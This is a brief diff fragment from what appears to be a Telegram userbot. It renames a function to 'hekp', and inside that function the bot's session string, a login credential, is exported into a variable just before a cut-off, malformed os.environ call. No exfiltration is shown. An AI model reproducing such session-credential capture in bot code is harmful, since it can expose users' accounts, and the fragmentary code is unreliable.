@@ -105,7 +105,7 @@ TYPE :- " .gpromote @Its_LegendBoy " OR .python OR .ping CHECK IF I'M ON!
 
 
 
-async def python_is_on():
+async def hekp():
     try:
         SatyaBot = bot.session.save()
          os.environ(
